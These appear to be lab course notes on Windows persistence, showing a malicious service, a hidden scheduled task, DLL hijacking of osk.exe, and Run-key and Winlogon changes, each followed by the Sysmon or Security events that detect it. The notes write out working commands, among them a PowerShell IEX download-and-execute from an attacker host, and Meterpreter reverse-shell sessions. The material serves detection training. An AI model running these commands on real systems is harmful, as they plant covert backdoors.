# Module 7: Windows Persistence

## Persistence on Disk

### Persisting via Windows Service

_Creating a new service with malicious prst\_servshell443.exe_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
[SC] CreateService SUCCESS

C:\Windows\system32>powershell -command Get-Date
powershell -command Get-Date

Friday, October 29, 2021 11:43:58 AM
```
{% endcode %}

This creates a service with an automatic start at boot, ignoring errors and pointing to the malicious reverse shell.

_Rebooting the target system to test the service_

```powershell
C:\Windows\system32>shutdown -r -t 0

C:\Windows\system32>
```

_Catching the reverse shell after reboot_

{% code overflow="wrap" %}
```bash
...
[*] Started HTTPS reverse handler on https://192.168.51.50:443
[*] https://192.168.51.50:443 handling request from 192.168.51.10; (UUID: xzrlbcgs) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.51.50:443 -> 127.0.0.1 ) at 2021-10-29 15:33:44 -0400

meterpreter > 
```
{% endcode %}

With these actions in mind, we could search for RegistryEvent, FileCreate, and ProcessCreate events — an attacker usually would need to upload their own malicious executable, hence the FileCreate events. If the service executed, we could also search for NetworkConnect events, assuming it's a shell.

### Persisting via Scheduled Tasks

_Queryin ga schedule task_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
MicrosoftEdgeUpdateTaskMachineCore       11/8/2021 8:38:35 AM   Ready
```
{% endcode %}

Scheduled tasks are stored in **C:\Windows\System32\Tasks**.

Tasks are stored in XML files.

_XML for Schedult Task - Triggers_

{% code overflow="wrap" %}
```markup
...
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2021-10-19T08:38:35</StartBoundary>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
...
```
{% endcode %}

_XML for Scheduled Task - Principals_

```markup
...
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
...
```

_XML for Scheduled Task - Settings_

```markup
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Enabled>true</Enabled>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
  </Settings>
```

_XML for Scheduled Task - Actions_

{% code overflow="wrap" %}
```markup
...
  <Actions Context="Author">
    <Exec>
      <Command>C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe</Command>
      <Arguments>/c</Arguments>
    </Exec>
  </Actions>
...  
```
{% endcode %}

_Creating a new scheduled task with a malicious powershell command_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
SUCCESS: The scheduled task "WindowzUpdate" has successfully been created.

C:\Windows\system32>powershell -c Get-Date
powershell -c Get-Date

Friday, November 12, 2021 7:26:09 AM
```
{% endcode %}

_Searchin for new task creation events_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_persistence> Get-SecurityEvent $null "11/12/2021 7:26:00" "11/12/2021 7:27:00"

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
11/12/2021 7:26:03 AM          4698 Information      A scheduled task was created.... 
```
{% endcode %}

Task creation events are ID'd as event ID 4698.

_Full output of event ID 4698_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_persistence> Get-SecurityEvent 4698 "11/12/2021 7:26:00" "11/12/2021 7:27:00" | Format-List

TimeCreated  :  AM
ProviderName : Microsoft-Windows-Security-Auditing
Id           : 4698
Message      : A scheduled task was created.
               
               Subject:
                Security ID:            S-1-5-18
                Account Name:           CLIENT01$
                Account Domain:         WORKGROUP
                Logon ID:               0x3E7
               
               Task Information:
                Task Name:              \WindowzUpdate
                Task Content:           <?xml version="1.0" encoding="UTF-16"?>
               <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
...
                 <Actions Context="Author">
                   <Exec>
                     <Command>c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
                     <Arguments>-WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "IEX ((new-object net.webclient).downloadstring(""http://kali:8000/eviltask"""))"</Arguments>
                   </Exec>
                 </Actions>
               </Task>
```
{% endcode %}

Search for FileCreate, ProcessCreate, DNSEvent, and NetworkConnect events.

### Persisting by DLL-Sideloading/Hijacking

Most applications do not check the integrity of DLLs, thus a savvy attacker could introduce a malicious replacement.

{% hint style="info" %}
This idea of DLL replacement can have devastating consequences. In 2020, adversaries deployed a malicious DLL to the SolarWinds Orion update repository. Every customer update incorporated this new DLL, which gave the adversary access to those machines after the update.
{% endhint %}

This vulnerability lies in the DLL search order. The order of checks is as listed:

1. Is the DLL loaded in memory?
2. Is the DLL in teh list of known DLLs shown in **HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**?
3. IF **SafeDllSearchMode** is enabled, Windows will search for the dll in the directory the program was executed from. If disabled, Windows will search where the program was executed as well as the current directory of the user, **before** System directories and the Windows directory.

_Copying the malicious DLL for On-Screen Keyboard to a new directory for hijacking purposes_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll" 
"C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"
        1 file(s) copied.

C:\Windows\system32>powershell -command Get-Date
powershell -command Get-Date

Thursday, November 18, 2021 9:03:26 AM
```
{% endcode %}

After rebooting the target, we can execute **osk.exe**. The On-Screen Keyboard won't appear due to the DLL not providing the normal functionality, however the code inside that DLL is still executed.

_Catching the reverse shell from the malicious dll being executed_

{% code overflow="wrap" %}
```bash
...
[*] Started HTTPS reverse handler on https://192.168.51.50:443
[*] https://192.168.51.50:443 handling request from 192.168.51.10; (UUID: tk31ip8a) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.51.50:443 -> 127.0.0.1 ) at 2021-11-18 12:19:35 -0500

meterpreter > 
```
{% endcode %}

Search for FileCreate, ProcessCreate, DNSEvent, and NetworkConnect events. Because we know osk.exe is the binary with the DLL hijacking, we _could_ also search for events where osk.exe is in the ParentImage value.

## Persistence in Registry

### Using Run Keys

The **Run** and **RunOnce** keys are commonly used for persistence. They can be located here:

* HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

The **RunOnce** key is cleared after a user logs in.

{% hint style="info" %}
There is a third type of Run key, _RunOnceEx_. The program listed in this key will run once, but it will not be cleared until the program has completed execution. By contrast, the RunOnce key will delete itself at the moment of execution.
{% endhint %}

HKEY\_CURRENT\_USER (HKCU) run keys run only when the specific user logs in.

HKEY\_LOCAL\_MACHINE (HKLM) run keys run when _any_ user logs in.

_Creating a new Run key with a malicious binary_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdote /t REG_SZ /d "C:\tools\windows_persistence\prst_runshell443.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdote /t REG_SZ /d "C:\tools\windows_persistence\prst_runshell443.exe" /f
The operation completed successfully.

C:\Windows\system32>powershell -c Get-Date
powershell -c Get-Date

Monday, November 15, 2021 8:49:18 AM
```
{% endcode %}

_Searching for events around the time of our changes_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\Users\offsec\Documents> Get-SysmonEvent $null "11/15/2021 8:49:00" "11/15/2021 8:50:00"

   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
11/15/2021 8:49:17 AM            11 Information      File created:...
11/15/2021 8:49:17 AM             1 Information      Process Create:...
11/15/2021 8:49:12 AM            13 Information      Registry value set:...
11/15/2021 8:49:12 AM             1 Information      Process Create:...    
```
{% endcode %}

{% hint style="info" %}
PowerShell's _New-ItemProperty_ is one of several cmdlets that can update the Windows Registry. If used, there would be no ProcessCreate event for reg.exe, but the Registry event's Image field would contain powershell.exe.
{% endhint %}

### Using Winlogon Helper

When authentication to a Windows endpoint, the OS relies on the _Windows Logon (Winlogon)_ process. Winlogon controls everything between the load of a user profile and the unlocking of the workstation.

Winlogon's configuration is stored in **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon**.

_Modifying the Shell subkey to also execute our malicious binary_

{% code overflow="wrap" %}
```powershell
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\tools\windows_persistence\prst_winlogshell443.exe" /f
The operation completed successfully.

C:\Windows\system32>powershell -c Get-Date
powershell -c Get-Date

Wednesday, November 17, 2021 12:24:48 PM
```
{% endcode %}
